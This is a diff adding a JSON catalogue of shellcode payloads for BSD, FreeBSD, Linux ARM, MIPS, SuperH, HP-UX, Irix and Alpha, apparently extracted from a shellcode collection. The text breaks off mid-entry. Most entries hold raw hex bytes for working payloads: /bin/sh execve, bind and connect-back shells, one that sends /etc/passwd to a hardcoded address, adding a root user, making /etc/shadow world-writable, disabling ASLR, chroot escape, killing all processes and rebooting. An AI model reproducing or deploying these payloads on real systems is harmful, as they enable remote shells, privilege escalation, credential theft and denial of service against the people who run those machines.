@@ -1,0 +1,4842 @@
+[
+  {
+    "source_file": ".venv/lib/python3.11/site-packages/greenlet/tests/_test_extension.c",
+    "bucket": "ascii",
+    "os": ".venv",
+    "arch": null,
+    "byte_count": 16,
+    "bytes_hex": "74616b652074686174207375636b6121",
+    "claimed_effect": "test extension",
+    "supported": true
+  },
+  {
+    "source_file": ".venv/lib/python3.11/site-packages/zope/interface/_zope_interface_coptimizations.c",
+    "bucket": "ascii",
+    "os": ".venv",
+    "arch": null,
+    "byte_count": 50,
+    "bytes_hex": "54657374207768657468657220612073706563696669636174696f6e206973206f7220657874656e647320616e6f74686572",
+    "claimed_effect": "zope interface coptimizations",
+    "supported": true
+  },
+  {
+    "source_file": "Aix/execve_-bin-sh.c",
+    "bucket": "other",
+    "os": "Aix",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve -bin-sh",
+    "supported": false
+  },
+  {
+    "source_file": "Alpha/-bin-sh.c",
+    "bucket": "other",
+    "os": "Alpha",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "-bin-sh",
+    "supported": false
+  },
+  {
+    "source_file": "Alpha/execve().c",
+    "bucket": "hex",
+    "os": "Alpha",
+    "arch": null,
+    "byte_count": 112,
+    "bytes_hex": "3015d9431174f04712940742fcff32b2ff473f261f043122fcff30b2f9ff1fd23015d9433115d8431204ff4740ff1eb648fffeb798ff7f26d08c73221204ff4740ff1eb648fffeb798ff7f26d08c73221305f3473cff7eb2696e7f262f62732238ff7eb21394e74320356042ffffffff",
+    "claimed_effect": "execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Alpha/setuid().c",
+    "bucket": "hex",
+    "os": "Alpha",
+    "arch": null,
+    "byte_count": 156,
+    "bytes_hex": "3015d9431174f04712140242fcff32b212940942fcff32b2ff473f2612140242fcff32b212940942fcff32b2ff473f261f043122fcff30b2f7ff1fd21004ff471114e34320352042ffffffff3015d9433115d8431204ff4740ff1eb648fffeb798ff7f26d08c73221305f3473cff7eb2696e7f262f627322d08c73221305f3473cff7eb2696e7f262f62732238ff7eb21394e74320356042ffffffff",
+    "claimed_effect": "setuid()",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/32bits/Passive_Connection.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "32bits",
+    "byte_count": 121,
+    "bytes_hex": "eb685e31c031dbb30653b30153b3025353b0618089c2c646010266c74602697ab310538d1e5350b062cd8031db5352b05a50cd80fec35352b05a50cd80fec35352b05a50cd8031db538d7e0fc031c9b109f3aa8d5e08895e108d4e105153503bcd80b001cd80e893ffffff414243437f00002f62696e2f7368",
+    "claimed_effect": "Passive Connection",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/ppc/execve(-bin-sh).c",
+    "bucket": "other",
+    "os": "BSD",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": false
+  },
+  {
+    "source_file": "BSD/x86/bindshell_on_port_2525.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 167,
+    "bytes_hex": "6a006a016a02506a6158cd80506a006a006a006a0068100209dd89e06a1050ff74241c506a6858cd806a01ff742428506a6a58cd8083ec106a108d44240489e15150ff74244c506a1e58cd8050ff742458506a0658cd806a00ff74240c506a5a58cd806a01ff742418506a5a58cd806a02ff742424506a5a58cd80687368000089e0682d69000089e16a005150682f736800682f62696e89e08d4c24086a005150506a3b58cd80",
+    "claimed_effect": "bindshell on port 2525",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/break_chroot.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 44,
+    "bytes_hex": "68622e2e2e89e733c088470357b08850cd8057b03d50cd804733c9b1ff5750b00ccd80e2fa4757b03d50cd80",
+    "claimed_effect": "break chroot",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/cat_-etc-master.passwd_&_mail_root@localhost.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 44,
+    "bytes_hex": "eb255931c050686e2f7368682f2f626989e35066682d6389e75051575389e750575350b03bcd80e8d6ffffff",
+    "claimed_effect": "cat -etc-master.passwd & mail root@localhost",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 20,
+    "bytes_hex": "eb0d5f31c05089e2525754b03bcd80e8eeffffff",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/execve(-bin-sh)_&_setuid(0).c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 29,
+    "bytes_hex": "31c050b01750cd8050686e2f7368682f2f626989e350545350b03bcd80",
+    "claimed_effect": "execve(-bin-sh) & setuid(0)",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/execve_-bin-sh_Crypt_-bin-sh.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 49,
+    "bytes_hex": "eb0e5e31c9b11cfe040ee2fbfe0656c3e8edffffffea0d5d30bf8745064f5355af3a4fcc7fe7ecfefefe2e61686d2e7267",
+    "claimed_effect": "execve -bin-sh Crypt -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/setreuid(geteuid(),_geteuid())_and_execve(-bin-sh,_-bin-sh,_0).c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 36,
+    "bytes_hex": "31c0b01950cd80505031c0b07e50cd80eb0d5f31c05089e2525754b03bcd80e8eeffffff",
+    "claimed_effect": "setreuid(geteuid(), geteuid()) and execve(-bin-sh, -bin-sh, 0)",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/setuid-execve.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 8,
+    "bytes_hex": "31c05050b017cd80",
+    "claimed_effect": "setuid-execve",
+    "supported": true
+  },
+  {
+    "source_file": "BSD/x86/setuid-portbind.c",
+    "bucket": "hex",
+    "os": "BSD",
+    "arch": "x86",
+    "byte_count": 70,
+    "bytes_hex": "31c05050b017cd8031c9f7e1514151415151b061cd8089c35266687a69665189e6b11051565050b068cd80515353b06acd8052525353b01ecd80b10389c3b05a49515353cd80",
+    "claimed_effect": "setuid-portbind",
+    "supported": true
+  },
+  {
+    "source_file": "Cisco_IOS/Bind_shellcode_v1.0.c",
+    "bucket": "other",
+    "os": "Cisco_IOS",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bind shellcode v1.0",
+    "supported": false
+  },
+  {
+    "source_file": "Cisco_IOS/Connectback_shellcode_v1.0.c",
+    "bucket": "other",
+    "os": "Cisco_IOS",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Connectback shellcode v1.0",
+    "supported": false
+  },
+  {
+    "source_file": "Cisco_IOS/Tiny_shellcode_v1.0.c",
+    "bucket": "other",
+    "os": "Cisco_IOS",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Tiny shellcode v1.0",
+    "supported": false
+  },
+  {
+    "source_file": "Cso/x86/execve(-bin-sh,_...,_NULL).c",
+    "bucket": "hex",
+    "os": "Cso",
+    "arch": "x86",
+    "byte_count": 43,
+    "bytes_hex": "31c989e368d08c97ff68d09d969189e268fff8ff6f689affffff80f110f6134be2fb9150545250343bffe3",
+    "claimed_effect": "execve(-bin-sh, ..., NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/-bin-sh.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "9952686e2f7368682f2f626989e3515253536a3b58cd80",
+    "claimed_effect": "-bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/8.0-RELEASE.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 47,
+    "bytes_hex": "31c050682d46616c89e150686663746c68696e2f70682f2f736289e350515389e1505153b03b50cd8031c05050cd80",
+    "claimed_effect": "8.0-RELEASE",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/Connect_Back_Port_6969.c",
+    "bucket": "other",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Connect Back Port 6969",
+    "supported": false
+  },
+  {
+    "source_file": "FreeBSD/x86/bind_sh_port_41254.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 115,
+    "bytes_hex": "eb645e31c08846076a066a016a02b06150cd8089c231c0c646090266c7460aa12689460c6a108d4608505231c0b06850cd806a015231c0b06a50cd8031c0505052b01e50cd80b103bbffffffff89c2435352b05a50cd8080e90175f331c0505056b03b50cd80e897ffffff2f62696e2f736823",
+    "claimed_effect": "bind sh port 41254",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/connect_back.send.exit_-etc-passwd.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 111,
+    "bytes_hex": "31c06a6466687377682f706173682f65746389e35053b00550cd8089c331c031c966b9050d5189e65653b00350cd8089c531c0b0065350cd8031c0506a016a02b06150cd8089c268c0a8012168aa021f4089e06a10505231c0b06250cd8031c0555652b00450cd8031c0405050cd80",
+    "claimed_effect": "connect back.send.exit -etc-passwd",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/connect_back_-bin-sh._81_bytes.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 81,
+    "bytes_hex": "31c0506a016a02b06150cd8089c2687f000001666805396668010289e16a10515231c0b06250cd8031c9515231c0b05a50cd80fec180f90375f031c050682f2f7368682f62696e89e3505453b03b50cd80",
+    "claimed_effect": "connect back -bin-sh. 81 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/encrypted_shellcode_-bin-sh_48_bytes.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 48,
+    "bytes_hex": "31d2eb0e31db5bb119832c1a0142e2f9eb05e8edffffff32c15169303074696930636a6f32dc8ae451555451b13cce81",
+    "claimed_effect": "encrypted shellcode -bin-sh 48 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/execv(-bin-sh).c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "31c050682f2f7368682f62696e89e3505453b03b50cd80",
+    "claimed_effect": "execv(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/execve(-bin-cat_&_-etc-master.passwd).c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve(-bin-cat & -etc-master.passwd)",
+    "supported": false
+  },
+  {
+    "source_file": "FreeBSD/x86/execve_-bin-sh_23_bytes.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "31c050682f2f7368682f62696e89e350545350b03bcd80",
+    "claimed_effect": "execve -bin-sh 23 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/execve_-bin-sh_37_bytes.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 30,
+    "bytes_hex": "eb175b31c0884307895b0889430c508d53085253b03b50cd80e8e4ffffff",
+    "claimed_effect": "execve -bin-sh 37 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/execve_-tmp-sh.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 34,
+    "bytes_hex": "31c050682f2f7368682f746d7089e3505389e250525350b03bcd8031c0405050cd80",
+    "claimed_effect": "execve -tmp-sh",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/kill_all_processes.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 12,
+    "bytes_hex": "31c06a09485040b02550cd80",
+    "claimed_effect": "kill all processes",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/kldload_-tmp-o.o.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 73,
+    "bytes_hex": "eb2c5e31c0b01750cd8031c050686e2f7368682f2f626989e35066682d6389e75056575389e750575350b03bcd80e8cfffffff2f7362696e2f6b6c646c6f6164202f746d702f6f2e6f",
+    "claimed_effect": "kldload -tmp-o.o",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/portbind_shell_+_fork.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 111,
+    "bytes_hex": "31c9f7e1514050405050b061cd809652666805396668010289e16a10515650b068cd8031c0b005505650b06acd8031c050505650b01ecd809731c050b002cd8009c074ea31c931c0515750b05acd80fec180f90375f052682f2f7368682f62696e89e3525389e1525153b03b50cd80",
+    "claimed_effect": "portbind shell + fork",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/portbind_shellcode.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 167,
+    "bytes_hex": "6a006a016a02506a6158cd80506a006a006a006a00681002053989e06a1050ff74241c506a6858cd806a01ff742428506a6a58cd8083ec106a108d44240489e15150ff74244c506a1e58cd8050ff742458506a0658cd806a00ff74240c506a5a58cd806a01ff742418506a5a58cd806a02ff742424506a5a58cd80687368000089e0682d69000089e16a005150682f736800682f62696e89e08d4c24086a005150506a3b58cd80",
+    "claimed_effect": "portbind shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/reboot().c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 15,
+    "bytes_hex": "31c066ba0e276681ea0627b037cd80",
+    "claimed_effect": "reboot()",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/reboot(RB_AUTOBOOT).c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 7,
+    "bytes_hex": "31c050b037cd80",
+    "claimed_effect": "reboot(RB AUTOBOOT)",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/reverse_connect_dl(shellcode)_and_execute,_exit.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 89,
+    "bytes_hex": "31c05050b01750cd80506a016a02b06150cd8089c268ac11000968aa021f4089e06a10505231c0b06250cd807524b10331db5352b05a50cd8043e2f631c0666804048d8c24fcfbffff5152b00350cd80ffe131c0405050cd80",
+    "claimed_effect": "reverse connect dl(shellcode) and execute, exit",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/reverse_portbind_-bin-sh.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "reverse portbind -bin-sh",
+    "supported": false
+  },
+  {
+    "source_file": "FreeBSD/x86/setreuid(0,_0)_&_execve(pfctl_-d).c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 55,
+    "bytes_hex": "31c05050b07e50cd8031c05066682d6489e150686663746c68696e2f70682f2f736289e350515389e1505153b03b50cd8031c05050cd80",
+    "claimed_effect": "setreuid(0, 0) & execve(pfctl -d)",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86/setuid(0)&execve;({--sbin-ipf,-Faa,0},0);.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "setuid(0)&execve;({--sbin-ipf,-Faa,0},0);",
+    "supported": false
+  },
+  {
+    "source_file": "FreeBSD/x86-64/Execve_-bin-sh.c",
+    "bucket": "other",
+    "os": "FreeBSD",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Execve -bin-sh",
+    "supported": false
+  },
+  {
+    "source_file": "FreeBSD/x86-64/bind_tcp_with_passcode.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86-64",
+    "byte_count": 127,
+    "bytes_hex": "6a61586a025f6a015e990f054897baff02aaaa80f2ff524889e699046680c2100f05046a0f05041e4831f6990f0548976a035852488d7424f080c2100f0548b8523243427730637257488d3e48af74084831c048ffc00f055f4889d04889fe48ffceb05a0f0575f799043b48bb2f62696e2f2f73685253545f5257545e0f05",
+    "claimed_effect": "bind tcp with passcode",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86-64/exec(-bin-sh)_Shellcode.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86-64",
+    "byte_count": 31,
+    "bytes_hex": "4831c099b03b48bf2f2f62696e2f736848c1ef08574889e757524889e60f05",
+    "claimed_effect": "exec(-bin-sh) Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86-64/execve.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86-64",
+    "byte_count": 28,
+    "bytes_hex": "4831c948f7e1043b48bb2f62696e2f2f73685253545f5257545e0f05",
+    "claimed_effect": "execve",
+    "supported": true
+  },
+  {
+    "source_file": "FreeBSD/x86-64/execve_-bin-sh_shellcode_34_bytes.c",
+    "bucket": "hex",
+    "os": "FreeBSD",
+    "arch": "x86-64",
+    "byte_count": 34,
+    "bytes_hex": "4831c9eb105e4889f756514889e64889cab03b0f0548e8eaffffff2f62696e2f7368",
+    "claimed_effect": "execve -bin-sh shellcode 34 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Hp-Ux/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Hp-Ux",
+    "arch": null,
+    "byte_count": 53,
+    "bytes_hex": "e83f1ffd08210280340201020841040260400162b45a01540b3902990b180298341604be20200801e420e00896d60534deadcafeff",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Irix/Bind_Port.c",
+    "bucket": "other",
+    "os": "Irix",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bind Port",
+    "supported": false
+  },
+  {
+    "source_file": "Irix/execve(-bin-sh).c",
+    "bucket": "other",
+    "os": "Irix",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": false
+  },
+  {
+    "source_file": "Irix/execve(-bin-sh_-c).c",
+    "bucket": "hex",
+    "os": "Irix",
+    "arch": null,
+    "byte_count": 60,
+    "bytes_hex": "0410ffff240203f323ff08f423e4f74023e5fb24afe4fb2423e6f748afe6fb2823e6f74cafe6fb2cafe0fb30a3e0f747a3e0f74a02048d0c01084025",
+    "claimed_effect": "execve(-bin-sh -c)",
+    "supported": true
+  },
+  {
+    "source_file": "Irix/stdin-read_shellcode.c",
+    "bucket": "other",
+    "os": "Irix",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "stdin-read shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/Add_map_in_-etc-hosts_file.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 79,
+    "bytes_hex": "01608fe216ff2fe1241b221cff21ff31ff31ff31053178462a30052701df142279460c31042701df241b201c012701df3132372e312e312e3120676f6f676c652e6c6b0a2f6574632f2f686f737473",
+    "claimed_effect": "Add map in -etc-hosts file",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/Bind_Connect_UDP_Port_68.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bind Connect UDP Port 68",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/Bindshell_port_0x1337.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bindshell port 0x1337",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/Disable_ASLR_Security.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 102,
+    "bytes_hex": "01308fe213ff2fe1241b201c172701df78462e30c821c831c831c831c8315931c822c8321432052701df032079460e310222042701df921a101c012701df300a2d2d2f2f70726f632f7379732f6b65726e656c2f72616e646f6d697a655f76615f7370616365",
+    "claimed_effect": "Disable ASLR Security",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/Kill_all_processes_(with-without__setuid).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 28,
+    "bytes_hex": "01308fe213ff2fe1241b201c172701df921a101c01380921252701df",
+    "claimed_effect": "Kill all processes (with-without setuid)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/Loader_Port_0x1337.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Loader Port 0x1337",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/add_root_user_with_password.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 151,
+    "bytes_hex": "055045e001508fe215ff2fe178467c30ff21ff31ff31ff314531dc22c832052701df80464146081c79461831c0464822042701df4146081c062701df1a49081c012701df7368656c6c2d73746f726d3a2431244b51596c2f79727524504d7430327a5554576d4d7650576355346f514c732f3a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a2f6574632f706173737764",
+    "claimed_effect": "add root user with password",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/chmod(-etc-shadow,_0777).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 44,
+    "bytes_hex": "01608fe216ff2fe178461230ff21ff3101310f2701df241b201c012701df2f6574632f736861646f7700c046",
+    "claimed_effect": "chmod(-etc-shadow, 0777)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/chmod(-etc-shadow,_0777)_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 24,
+    "bytes_hex": "01608fe216ff2fe178460c30ff21ff310f2701df012701df",
+    "claimed_effect": "chmod(-etc-shadow, 0777) Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/connect_back_-bin-sh._79_bytes.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "connect back -bin-sh. 79 bytes",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/execve(-bin-sh,NULL,0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 31,
+    "bytes_hex": "01308fe213ff2fe178460c30c0460190491a921a0b2701df2f62696e2f7368",
+    "claimed_effect": "execve(-bin-sh,NULL,0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/execve(-bin-sh,_-bin-sh,_0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 30,
+    "bytes_hex": "01308fe213ff2fe178460a30019001a9921a0b2701df2f2f62696e2f7368",
+    "claimed_effect": "execve(-bin-sh, -bin-sh, 0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/execve(-bin-sh,_[0],_[0_vars]).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 32,
+    "bytes_hex": "01608fe216ff2fe178460a30019001a9921a0b2701df2f2f62696e2f73680000",
+    "claimed_effect": "execve(-bin-sh, [0], [0 vars])",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/ifconfig_eth0_and_Assign_Address.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "ifconfig eth0 and Assign Address",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/polymorphic_chmod(-etc-shadow,_0777).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 72,
+    "bytes_hex": "24608fe216ff2fe1de40a0e3010c54e31eff2f81de4044e20450dee7025085e20450cee7df4084e2f7ffffeaf5ffffebff5e8de014fd2ddf76440a2efd1ffd2f0d25ffddff25ffdd",
+    "claimed_effect": "polymorphic chmod(-etc-shadow, 0777)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ARM/reverse_shell(tcp,10.1.1.2,0x1337).c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "reverse shell(tcp,10.1.1.2,0x1337)",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ARM/setuid(0)_&_execve(-bin-sh,_-bin-sh,_0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "arm",
+    "byte_count": 38,
+    "bytes_hex": "01308fe213ff2fe1241b201c172701df78460a30019001a9921a0b2701df2f2f62696e2f7368",
+    "claimed_effect": "setuid(0) & execve(-bin-sh, -bin-sh, 0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/StrongARM/bind()_portshell.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "strongarm",
+    "byte_count": 196,
+    "bytes_hex": "20608fe2077047e00170c6e5013087e21307a0e1012083e20740a0e10ee04ee01c402de90d10a0e166ff90ef1057a0e13570c6e51420a0e38228a9e1022082e214402de91030a0e30d20a0e10d402de90220a0e31207a0e10d10a0e166ff90ef4570c6e5022082e21207a0e166ff90ef5d70c6e5012082e21207a0e104708de508708de566ff90ef1057a0e10210a0e37170c6e51507a0e13fff90ef011051e2fbffff5a9970c6e514308fe204308de504108de2022042e01302a0e108208de50bff90ef",
+    "claimed_effect": "bind() portshell",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/StrongARM/execve().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "strongarm",
+    "byte_count": 40,
+    "bytes_hex": "022042e01c308fe204308de508208de51302a0e10720c3e504308fe204108de20120c3e50b0b90ef",
+    "claimed_effect": "execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/StrongARM/setuid().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "strongarm",
+    "byte_count": 20,
+    "bytes_hex": "022042e004108fe21202a0e10120c1e5170b90ef",
+    "claimed_effect": "setuid()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/SuperH/sh4.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": null,
+    "byte_count": 27,
+    "bytes_hex": "17e34e240bc33a230be302c703645a256a260bc32f62696e2f7368",
+    "claimed_effect": "sh4",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/SuperH/sh4_execve(-bin-sh,_0,_0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": null,
+    "byte_count": 12,
+    "bytes_hex": "0be302c703645a256a2602c3",
+    "claimed_effect": "sh4 execve(-bin-sh, 0, 0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/Reverse_Shell_Shellcode.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Reverse Shell Shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/mips/add_user(UID_0)_with_password.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 164,
+    "bytes_hex": "240973500530ffff240973503c0f302f35ef65743c0e632f35ce70613c0d737335ad7764afaffff3afaefff7afadfffbafa0ffff27a4fff42405016d24020fa50101010cafa2fffc8fa4fffc23e5100c20a5f0602409ffd30120302724020fa40101010c24020fa60101010c2804ffff24020fa10101010c724f4f743a584a3147562e6e7946464d6f493a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a",
+    "claimed_effect": "add user(UID 0) with password",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/connect_back_shellcode_(port_0x7a69).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 168,
+    "bytes_hex": "240ffffd01e0202701e028272806ffff240210570101010cafa2ffff8fa4ffff240ffffd01e07827afafffe03c0e7a6935ce7a69afaeffe43c0dc0a835ad0164afadffe623a5ffe2240cffef018030272402104a0101010c240ffffd01e028278fa4ffff24020fdf0101010c20a5ffff2401ffff14a1fffb2806ffff3c0f2f2f35ef6269afaffff43c0e6e2f35ce7368afaefff8afa0fffc27a4fff42805ffff24020fab0101010c",
+    "claimed_effect": "connect back shellcode (port 0x7a69)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 48,
+    "bytes_hex": "ffff1004ab0f022455f046206606ff23c2f9ec236606bd239af9acaf9ef9a6af9af9bd23212080012128a003cccd4403",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/execve(-bin-sh,[-bin-sh],[]);.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 52,
